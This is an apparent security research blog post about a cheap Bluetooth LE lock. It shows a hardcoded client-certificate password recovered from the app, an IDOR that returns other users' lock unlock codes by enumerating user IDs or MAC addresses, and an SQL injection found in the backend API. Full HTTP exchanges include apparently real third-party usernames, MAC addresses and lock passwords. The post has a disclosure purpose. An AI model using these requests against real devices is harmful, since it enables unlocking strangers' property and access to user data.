---
title: The weird BLE-Lock
date: 2022-11-27
layout: post
type: blog
slug: the-weired-ble-lock
published: true
---

**tl;dr;** My knowledge in Bluetooth LE Communication got quite rusty over time and i wanted to refresh it with an easy target the other day. I wanted to open up the lock with a simple bluetooth command but ended up having access to their entire backend database with a lot of unique users across their entire product lineup.

It didn't go as planned.

## The Lock and API
As all BLE-Locks work, they require an App to talk to the Lock itself and an API on the company side.

I loaded the application into my trusted rooted android phone and started proxien all requests through Burp to look for API clues how this communication works.

Unfortunately the communication didn't work first time, because the server required a client certificate to authenticate against the webserver.

The certificates were found pretty fast in the ressources directory. But the `pkcs12` still needed a password i had to comb through the binary for.

After some digging, i found the method `C0015b` which loads the TrustManager and loads the PKCS12 files with a Password `daqitech2017` into the Keystore.

Password in file: `/c/g/a/a/m/b.java`

```java
public static C0015b c(Context context) {
    X509TrustManager x509TrustManager;
    C0015b bVar = new C0015b();
    InputStream openRawResource = context.getResources().openRawResource(g.server_pwd);
    InputStream openRawResource2 = context.getResources().openRawResource(g.client_pwd);
    try {
        SSLContext sSLContext = SSLContext.getInstance("TLS");
        KeyStore keyStore = KeyStore.getInstance("PKCS12");
        KeyStore keyStore2 = KeyStore.getInstance("PKCS12");
        keyStore.load(openRawResource, "daqitech2017".toCharArray());
        keyStore2.load(openRawResource2, "daqitech2017".toCharArray());
```

Heureka, the password was found and i was able to include the certificate into burp.

![]({{site.baseurl}}/img/posts/2022/Pasted image 20221103195341.png)

### Login
After a registration and login request is was time to observe the communication of the app to the backend servers.

```
https://[redacted]/?m=lock&a=getLockInfoByMac
https://[redacted]/?m=share&a=getFaceUrl
https://[redacted]/?m=Socket&a=lockList
https://[redacted]/?m=sts&a=oss_params
https://[redacted]/?m=user&a=register
```

The whole communication relies quite heavily on `POST` requests with `GET` parameter determining some kind of module (Parameter: `m`) and a subcommand (Parameter: `a`). It was way more interesting to look into the `POST`-Parameter.

After a successful login a `loginToken` is being transfered to keep for safekeeping. It is needed in every request, but only for validity and not content access, as we discover later.

```http
POST /?m=user&a=login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Host: [redacted]
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.9.1

user_name=nuitgaspard&user_pwd=[redacted]&type=2&way=2&message_lang=en-us
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 03 Aug 2022 19:33:55 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.2.24
Content-Length: 268

{
  "state": "success",
  "type": 0,
  "desc": "接口操作成功",
  "id": "508492",
  "email": "",
  "loginToken": "25cba956d908[...redacted...]",
  "avatarPath": "",
  "level": "0",
  "mobile": null,
  "nickname": "nuitgaspard",
  "loginName": "nuitgaspard",
  "way": "2",
  "bucket_name": null,
  "end_point": null
}
```


## Who are you, and what locks do you command?

If we look closely on the request to get a locklist (`m=Socket&a=locklist`), a user es defined with the `POST` parameter `user_id`. This ID seems to be a normal counter.

You can basically run over all 50k UserIDs and get every user having an Account.

```http
POST /?m=Socket&a=lockList HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Host: [redacted]
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.9.1

loginToken=1eb8bbfa1c[...redacted....]&type=2&cp=el&user_id=508486&page=1
```

The following Response does not show my User. It is user `508486`

```http
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 03 Aug 2022 20:03:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.2.24
Content-Length: 792

{
  "state": "success",
  "type": 0,
  "desc": "接口操作成功",
  "data": [
    {
      "mac": "A4:C1:38:22:0A:33",
      "isMaster": 0,
      "masterId": 506827,
      "masterName": "innovatekink",
      "shareType": 1,
      "time_zone": "+02:00",
      "shareLockTimeArray": [
        {
          "startTime": "00:00",
          "enable": 1,
          "endTime": "23:59",
          "repeat": 127
        },
        {
          "startTime": "00:00",
          "enable": 0,
          "endTime": "23:59",
          "repeat": 127
        },
        {
          "startTime": "00:00",
          "enable": 0,
          "endTime": "23:59",
          "repeat": 127
        }
      ],
      "shareLockTime": 0,
      "name": "Riri",
      "password": "861226",
      "admin_password": "861226",
      "fgpSup": 1,
      "protocolVersion": "7",
      "fwVersion": "1.30.5.0",
      "preLoseSup": 0,
      "preLose": 0,
      "backAdvSup": 0,
      "backAdv": 0,
      "locationSetup": 1,
      "alarmSup": 0,
      "alarmState": 0,
      "order_type": 0,
      "fg_num": 2,
      "last_open_user": "kinkysexboy",
      "last_time": "2022-07-21 01:31:55",
      "last_timeUTC": "2022-07-20 17:31:55",
      "admin_name": "innovatekink"
    }
  ]
}
```

If you look closely on the Response, you can even spot the password of the lock, which get's send by BLE. 

I thought to myself. NICE! I can now open every lock they have. 

So i looked on, if i can find a better function to get informations about a specific lock.

## Open Sesam: one request for every lock
There is a function called `getLockInfoByMac`,  which the mac address of this lock a `POST` Argument and gets back with all information about lock.

```http
POST /?m=lock&a=getLockInfoByMac HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.9.1

mac=A4%3aC1%3a38%3a21%3a7F%3aD0&loginToken=92103907b8e0[...redacted....]&type=1&cp=&isBind=0
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 24 Nov 2022 08:37:09 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/7.2.24
Content-Length: 188

{
  "state": "success",
  "type": 0,
  "desc": "接口操作成功",
  "data": {
    "name": "lock",
    "mac": "A4:C1:38:21:7F:D0",
    "isBind": 1,
    "password": "475029",
    "reset": 1,
    "lock_status": 1,
    "admin_password": "475029"
  }
}
```

We now have a method to lookup every lock in existence. I take the assumptions, they are nice people and respect the first 3 bytes of the Mac-Address to be a Vendor Identifier, we "only" have to crawl for `255*255*255` possibilities.

But something weird popped up.

![]({{site.baseurl}}/img/posts/2022/Pasted image 20221124094309.png)

## It was at that moment, they knew, they fucked up
I usually do my whole shennanigans with APIs with Burp. My Burp configuration does automatic checks with single or double quotes on every parameter.

Adding a single and double quote (yes you need both) at the `mac` parameter produces an interesting output:

```json
{
  "state": "fail",
  "type": 1,
  "desc": "\"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\\\"' at line 1\""
}
```

Uiuiuiuiui....that doesn't look good. 

After poking around in the potential SQLi, i found a working reliable exploit and looked at the impact. There are around 180 Tables. This does not only affect the lock Product line. As i suspected from the first argument in the `GET` parameter, the API is used by other products like cameras and so on, as well.

| Table             | Entries |
| ----------------- | ------- |
| users             | 502244  |
| apple_pay_receipt | 1514    |
| camera_user       | 99955   |


This is a  major impact on these devices coming from a 20 Euro Bluetooth Lock.

# Disclosure Timeline

- 26 July: Asking for Security Contact
- 28 August: Asking again for security contact
- Release date of this Blog post: Sent them this Blogpost.

# Fazit
If you own something from `https://www.elinksmart.net/`, consider your password compromised and locks/cameras/etc not secure.

# References:

* [https://www.youtube.com/watch?v=AIaFleFMPn0](https://www.youtube.com/watch?v=AIaFleFMPn0) - LockPickingLawyer
* [https://www.lockhacking.com/2022/05/24/elinksmart-padlock-cracked.html](https://www.lockhacking.com/2022/05/24/elinksmart-padlock-cracked.html) - Attack BLE on this lock
